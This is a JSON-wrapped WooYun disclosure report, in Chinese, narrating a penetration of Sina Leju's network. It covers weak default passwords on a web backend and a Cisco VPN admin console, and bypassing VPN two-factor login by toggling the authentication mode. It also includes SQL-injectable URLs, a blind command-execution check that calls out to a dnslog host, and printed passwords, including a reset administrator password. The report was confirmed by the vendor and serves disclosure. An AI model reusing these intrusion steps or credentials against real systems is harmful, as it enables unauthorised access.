{"id": 86746, "wybug_id": "wooyun-2016-0191286", "wybug_title": "对新浪乐居的一次渗透测试", "wybug_corp": "新浪乐居", "wybug_author": "if、so", "wybug_date": "2016-04-01 09:12", "wybug_open_date": "2016-05-16 09:50", "wybug_type": "服务弱口令", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-16：\t细节向公众公开  简要描述： 谁能告诉我乐居和渣浪内网到底在不在一起？！！！ 详细说明：  下班回来，打开电脑继续开始尝试漫游新浪之旅。。看了半天，没啥进展，于是想到了公司分部网络可能相连，想先进乐居内网，再进新浪内网，最后走上一条不归路。http://lx.leju.com 后台弱口令 admin 123 123\n\n进入后台，存在注入\nhttp://lx.leju.com:80/tongji/lixiangtj?city=2&moban=&type=1&form_id=9\ntype参数存在注入\n\n注入出一些邮箱，开始尝试爆破，爆破未果。。。后来发现重头戏了https:://vpn.leju.com\n\n思科的ssl vpn，还有一个动态密码验证，尼玛由于之前的cisco-asa认证绕过漏洞，导致我对cisco ssl vpn很熟悉，于是访问https:://vpn.leju.com/admin跳出来了管理员管理认证窗口，尝试admin admin 成功登陆。。。也是醉了，这么重要的密码竟然是弱口令。。\n\n果断下载控制台，成功进入cisco ASDM 控制台\n\n尝试添加用户访问SSLVPN\n\n有个本地用户，果断添加一个，level15，acess full all 的用户可是发现无法连接sslvpn，不管怎么设置，后来发现是因为认证是需要动态码的，可是对动态码配置不是很熟悉，翻遍了也没有找到管理接口在哪折腾了好久，发现下面的东西\n\nleju的vpn组认证方式是dkey的，也就是动态码，上面的都是本地用户，但是上面2个都没有启用，于是我想到，能不能先把leju的认证方式改成本地认证，然后等我连上，再把认证方式改成dkey的，并且祈求vpn不会断线，让我重新认证\n\n果断开始改，成功连接vpn\n\n再把认证方式该成dkey，最后竟然没有断开连接！！\n\n下面就是漫游了，想搞清楚究竟内网和新浪内网到底在不在一起。\n\n老规矩，列个内网域名\n\n\n\n\n\n\n\n列举几个内部系统搞了好久，最后得结论：内网不在一起，新浪是新浪，乐居是乐居！内网渗透：遇到个点，搞了好久，最后才进去，发现是自己傻逼了。。。\n\n内网的web:http://10.207.0.180/登陆存注入：\nhttp://10.207.0.180/checkpwd.asp?ji=5&password=g00dPa%24%24w0rD&UserName=1\nusername存在注入，SqlServer ，sa权限可以执行命令，但是不回显，并且本机没开1433，就下意识的以为SqlServer是其他机器，库站分离\n\n毕竟内网这么多SqlServer，尝试盲执行命令，加个用户\n\n也不知道会不回显，扫描了开启3389的机器，一台台去登陆，没有成功，觉得命令没有执行成功，尝试cloudeyetelnet jboss5.662472.dnslog.info 53成功收到结果\n01-Apr-2016 02:18:15.574 queries: client 202.106.196.219#28205 (jboss5.662472.dnslog.info): query: jboss5.662472.dnslog.info IN A -EDC (128.199.200.236)01-Apr-2016 02:32:25.804 queries: client 202.106.196.212#46002 (jboss5.662472.dnslog.info): query: jboss5.662472.dnslog.info IN A -EDC (128.199.200.236)\n说明命令确实执行了，所以下面的任务就是确定内网ip但是问题来了，我sql很渣，并且现在各大isp都封445端口，没法拷贝反弹程序到vps上，这里陷入了僵局。后来想到了servername，毕竟内网机器名可以扫描到的通过sql-shell执行\nsql-shell> select @@servername[02:43:48] [INFO] fetching SQL SELECT statement query output: 'select @@servername'[02:43:49] [INFO] retrieved: SHICHANGselect @@servername:    'SHICHANG'\n成功得到servername，开启扫描器扫描最后扫描出来了机器\n\n。。。真是日了狗，就是本机，因为1433没对外开放。。。那么为什么添加用户命令没有成功了？后来仔细一看是自己傻逼了\n\n有一个/ ，这肯定是不能执行成功的，逗比了。。。果断重置administrator密码。。 密码：xx.asd.8\n\n搞完收工走人，洗洗睡。。   漏洞证明：  \n\n\n\n   修复方案：  最后问一句厂商，内网到底和新浪在不在一起，有没有相通的？   版权声明：转载请注明来源 if、so@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-01 09:44 厂商回复： 谢谢您对乐居的关注，我们马上会对问题进行修复，再次感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-01 09:41 |    \t\t珈蓝夜宇 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:34        | 人不彻底绝望一次，就不会懂得什么是自己最...)\t\t \n  不在一起的    \n     2016-04-01 09:52 |    \t\t新浪乐居(乌云厂商)\t\t \n  请问怎么给白帽子发礼物？    \n     2016-04-01 09:56 |    \t\tnull_z \t\t\t( 普通白帽子  |\t\t\t        Rank:973 漏洞数:111        | AlphaGo)\t\t \n  @新浪乐居 来了这么多年还不知道怎么发礼物。。。。。    \n     2016-04-01 09:58 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1809 漏洞数:214        | 不接单、不黑产；如遇冒名顶替接单收徒、绝...)\t\t \n  @新浪乐居 发礼物的事儿，你可以私聊我，嗯，不谢    \n     2016-04-01 10:06 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:1020 漏洞数:123        | Portulaca grandiflora Hook.)\t\t \n  @Coody 哈哈，搞得很热心似的。。    \n     2016-04-01 10:08 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1124 漏洞数:195        | px1624)\t\t \n  @新浪乐居 按也发过不少乐居的洞，给俺也来一发吧。    \n     2016-04-01 10:16 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1199 漏洞数:103        | Enjoy Hacking)\t\t \n  @新浪乐居 厂商私信我，哈哈    \n     2016-04-01 10:38 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:573 漏洞数:74        | 嗨)\t\t \n  还有礼物~~~    \n     2016-04-01 11:45 |    \t\t我是壮丁  \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:2        | 专业打酱油)\t\t \n  @if、so 我下次不逗你了。。。    \n     2016-04-01 23:45 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:32        | 不是因为看到了希望才去努力，而是努力了才...)\t\t \n  @if、so 今天愚人节，厂商说的你还真信了。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}